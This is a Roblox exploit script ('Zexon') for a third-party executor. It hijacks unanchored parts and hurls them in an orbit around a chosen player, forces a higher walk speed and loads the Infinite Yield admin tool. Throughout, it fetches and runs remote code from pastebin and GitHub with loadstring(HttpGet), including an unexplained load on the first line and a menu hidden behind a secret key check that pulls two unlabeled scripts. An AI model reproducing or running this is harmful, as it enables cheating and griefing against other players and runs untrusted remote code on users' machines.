loadstring(game:HttpGet('https://pastebin.com/raw/XQp2bfhe'))()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")

local angle = 1
local radius = 1
local angleSpeed = 1
local points = 1
local blackHoleActive = false
local blackHolePoints = {}
local humanoidRootPart, Attachment1
local nodeStrength = 25000
local nodeSpeed = 2500

local settingsFile = "zexon-settings.json"
local defaultSettings = {
    nodeResponse = 2500,
    nodeTorque = 25000,
    speed = 10,
    range = 10,
    nodes = 1
}

local settings = {}


local function saveSettings()
    local json = HttpService:JSONEncode(settings)
    writefile(settingsFile, json)
end

local function loadSettings()
    if isfile(settingsFile) then
        local json = readfile(settingsFile)
        settings = HttpService:JSONDecode(json)
    else
        settings = defaultSettings
        saveSettings()
    end
end



local targetPlayer = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") or nil

if not getgenv().Network then
    getgenv().Network = {
        BaseParts = {},
        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
    }

    Network.RetainPart = function(part)
        if typeof(part) == "Instance" and part:IsA("BasePart") and part:IsDescendantOf(Workspace) then
            table.insert(Network.BaseParts, part)
            part.CustomPhysicalProperties = PhysicalProperties.new(0.001, 0, 0, 0, 0)
            part.CanCollide = false
        end
    end

    local function EnablePartControl()
        LocalPlayer.ReplicationFocus = Workspace
        RunService.Heartbeat:Connect(function()
            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
            for _, part in pairs(Network.BaseParts) do
                if part:IsDescendantOf(Workspace) then
                    part.Velocity = Network.Velocity
                end
            end
        end)
    end

    EnablePartControl()
end

local function setupPlayer()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then
        return nil, nil, nil
    end

    -- Ensure CycloneNodes folder exists
    local Folder = Workspace:FindFirstChild("CycloneNodes")
    if not Folder then
        Folder = Instance.new("Folder", Workspace)
        Folder.Name = "CycloneNodes"
    end

    -- Create an attachment part (optional logic)
    local Part = Instance.new("Part", Folder)
    local Attachment = Instance.new("Attachment", Part)
    Part.Anchored = true
    Part.CanCollide = false
    Part.Transparency = 0
    Part.Size = Vector3.new(1, 1, 1)

    return humanoidRootPart, Attachment, Folder
end

local function updateBlackHolePoints(count)
    -- Destroy old points
    for _, part in pairs(blackHolePoints) do
        if part.Parent then
            part.Parent:Destroy()
        end
    end
    blackHolePoints = {}

    for i = 1, count do
        local Part = Instance.new("Part", Workspace.CycloneNodes)
        local Attachment = Instance.new("Attachment", Part)
        Part.Anchored = true
        Part.CanCollide = false
        Part.Transparency = 0.5
        Part.Size = Vector3.new(1, 1, 1)
        table.insert(blackHolePoints, Attachment)
    end
end

local function ForcePart(v)
    if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then
            v:FindFirstChild("Attachment"):Destroy()
        end
        if v:FindFirstChild("AlignPosition") then
            v:FindFirstChild("AlignPosition"):Destroy()
        end
        if v:FindFirstChild("Torque") then
            v:FindFirstChild("Torque"):Destroy()
        end
        v.CanCollide = false

        Network.RetainPart(v)
        local Torque = Instance.new("Torque", v)
        Torque.Torque = Vector3.new(nodeStrength, nodeStrength, nodeStrength)
        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)
        Torque.Attachment0 = Attachment2
        AlignPosition.MaxForce = math.huge
        AlignPosition.MaxVelocity = math.huge
        AlignPosition.Responsiveness = nodeSpeed
        AlignPosition.Attachment0 = Attachment2

        if #blackHolePoints > 0 then
            local pointIndex = math.random(1, #blackHolePoints)
            AlignPosition.Attachment1 = blackHolePoints[pointIndex]
        end
    end
end

local function toggleBlackHole()
    blackHoleActive = not blackHoleActive
    if blackHoleActive then
        for _, v in next, Workspace:GetDescendants() do
            ForcePart(v)
        end

        Workspace.DescendantAdded:Connect(function(v)
            if blackHoleActive then
                ForcePart(v)
            end
        end)
        spawn(function()
            while blackHoleActive and RunService.RenderStepped:Wait() do
                angle = angle + math.rad(angleSpeed)
                local targetCFrame = (targetPlayer and targetPlayer.CFrame) or humanoidRootPart.CFrame

                for i, attachment in pairs(blackHolePoints) do
                    local angleOffset = (math.pi * 2 / #blackHolePoints) * (i - 1)
                    local offsetX = math.cos(angle + angleOffset) * radius
                    local offsetZ = math.sin(angle + angleOffset) * radius

                    attachment.WorldCFrame = targetCFrame * CFrame.new(offsetX, 0, offsetZ)
                end
            end
        end)
    else
        for _, part in pairs(Network.BaseParts) do
            if part:IsDescendantOf(Workspace) then
                part.CustomPhysicalProperties = nil
                part.CanCollide = true
                part.Velocity = Vector3.new(0, 0, 0)
                part.RotVelocity = Vector3.new(0, 0, 0)

                for _, child in pairs(part:GetChildren()) do
                    if child:IsA("Attachment") or child:IsA("AlignPosition") or child:IsA("Torque") then
                        child:Destroy()
                    end
                end

                part.Position = Vector3.new(0, -1000, 0)
            end
        end

        Network.BaseParts = {}

        for _, attachment in pairs(blackHolePoints) do
            attachment.WorldCFrame = CFrame.new(0, -1000, 0)
        end
    end
end

local function applySettings()
    nodeSpeed = settings.nodeResponse
    nodeStrength = settings.nodeTorque
    angleSpeed = settings.speed
    radius = settings.range
    points = settings.nodes
    settings.autosaveEnabled = settings.autosaveEnabled or false
    settings.autosaveNotifications = settings.autosaveNotifications or false
    updateBlackHolePoints(points)
end

LocalPlayer.CharacterAdded:Connect(function()
    humanoidRootPart, Attachment1 = setupPlayer()
end)

humanoidRootPart, Attachment1, Folder = setupPlayer()
updateBlackHolePoints(points)
loadSettings()
applySettings()

blackHoleActive = false

-- UI Library
local uilibrary = loadstring(game:HttpGet("https://pastebin.com/raw/1Qg7Lmad"))()
local windowz = uilibrary:CreateWindow("                                                              Zexon", "Script Menu", true)

-- Pages and Sections
local mainPage = windowz:CreatePage("Main - FE")
local mainSection = mainPage:CreateSection("Main")

mainSection:CreateButton("   Execute | Inf Yield", function ()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

mainSection:CreateSlider("   Change WalkSpeed", {Min = 16, Max = 150, DefaultValue = 16}, function(Value)
    local speaker = game.Players.LocalPlayer
    local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
    local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")

    if Char and Human then
        Human.WalkSpeed = Value
    end

    HumanModCons = HumanModCons or {}
    HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
        if Human then
            Human.WalkSpeed = Value
        end
    end)

    HumanModCons.wsCA = (HumanModCons.wsCA and HumanModCons.wsCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
        Char, Human = nChar, nChar:WaitForChild("Humanoid")
        Human.WalkSpeed = Value
        HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
            if Human then
                Human.WalkSpeed = Value
            end
        end)
    end)
end)

local CyclonePage = windowz:CreatePage("Cyclone - FE")
local CycloneSection = CyclonePage:CreateSection("Main - Settings")

CycloneSection:CreateSlider("   Speed        - Orbit speed", {Min = 1, Max = 100, DefaultValue = settings.speed}, function(Value)
    settings.speed = Value
    angleSpeed = Value
end)

CycloneSection:CreateSlider("   Range        - Distance between the player", {Min = 1, Max = 100, DefaultValue = settings.range}, function(Value)
    settings.range = Value
    radius = Value
end)

CycloneSection:CreateSlider("   Nodes        - Amount of cyclones", {Min = 1, Max = 10, DefaultValue = settings.nodes}, function(Value)
    settings.nodes = Value
    points = Value
    updateBlackHolePoints(points)
end)

CycloneSection:CreateToggle("   Enable Cyclone", {Toggled = false, Description = false}, function(Value)
    if Value then
        toggleBlackHole()
        uilibrary:AddNoti("Cyclone Enabled", "If you die, this will automatically disable.", 10, true)
    else
        blackHoleActive = false
    end
end)

local CycloneMiscSection = CyclonePage:CreateSection("Misc - Settings")

CycloneMiscSection:CreateSlider("   Node Response        - Reaction speed of nodes", {Min = 1, Max = 5000, DefaultValue = settings.nodeResponse}, function(Value)
    settings.nodeResponse = Value
    nodeSpeed = Value
end)

CycloneMiscSection:CreateSlider("   Node Torque              - Strength speed of nodes", {Min = 1, Max = 50000, DefaultValue = settings.nodeTorque}, function(Value)
    settings.nodeTorque = Value
    nodeStrength = Value
end)

local playerDropdown

local function refreshPlayerDropdown()
    local playerNames = {}
    for _, player in pairs(Players:GetPlayers()) do
        table.insert(playerNames, player.Name)
    end

    if playerDropdown then
        playerDropdown:Clear()
        playerDropdown:Add(playerNames)
    end
end

playerDropdown = CycloneMiscSection:CreateDropdown("   Select Player", {
    List = {},
    Default = LocalPlayer.Name 
}, function(selectedPlayerName)
    local player = Players:FindFirstChild(selectedPlayerName)
    if player and player.Character then
        targetPlayer = player.Character:FindFirstChild("HumanoidRootPart")
    else
        targetPlayer = nil
    end
end)


Players.PlayerAdded:Connect(refreshPlayerDropdown)
Players.PlayerRemoving:Connect(refreshPlayerDropdown)
refreshPlayerDropdown()

local player = game.Players.LocalPlayer
local function onCharacterAdded(character)
    uilibrary:AddNoti("Respawn Detected", "Cyclone reset to prevent issues. (Dropdown must be changed)", 15, true)
    blackHoleActive = false
end
player.CharacterAdded:Connect(onCharacterAdded)


local settingsPage = windowz:CreatePage("Settings")
local settingsSection = settingsPage:CreateSection("Zexon - Settings")

function loadGetServiceV95()
    local serviceV96 = windowz:CreatePage("ServiceTab - FE")
    local serviceSectionV98 = serviceV96:CreateSection("Service - Settings")
    serviceSectionV98:CreateButton("   Unpack | ServiceV6", function ()
    loadstring(game:HttpGet('https://pastebin.com/raw/c3b0rWf1'))()
    end)
    serviceSectionV98:CreateButton("   Unpack | ServiceV15", function ()
    loadstring(game:HttpGet('https://pastebin.com/raw/2Xk8Tm8r'))()
    end)
end
if getgenv().syLaBgQEIxLMqjOuVhNop3AUXlcDG3 == "3mgSJ9XjIBEmIsFmAdrukvtLWnMQoc6z" then
    loadGetServiceV95()
end


settingsSection:CreateToggle("   Autosave Notifications", {Toggled = settings.autosaveNotifications, Description = "Toggle autosave notifications on/off"}, function(Value)
    settings.autosaveNotifications = Value
    autosaveNotifications = Value
    saveSettings()

end)

settingsSection:CreateToggle("   Enable Autosave", {Toggled = settings.autosaveEnabled, Description = "Enable or disable autosaving configurations"}, function(Value)
    settings.autosaveEnabled = Value 
    saveSettings()

end)



spawn(function()
    while true do
        task.wait(15)
        if settings.autosaveEnabled then
            saveSettings()
            if autosaveNotifications then
                uilibrary:AddNoti("Settings Autosaved.", "Zexon has successfully autosaved your settings.", 5, true)
            end
        end
        
    end
end)

spawn(function()
    task.wait(1)
    uilibrary:AddNoti("UI loaded.", "Zexon has successfully loaded your settings.", 5, true)
end)

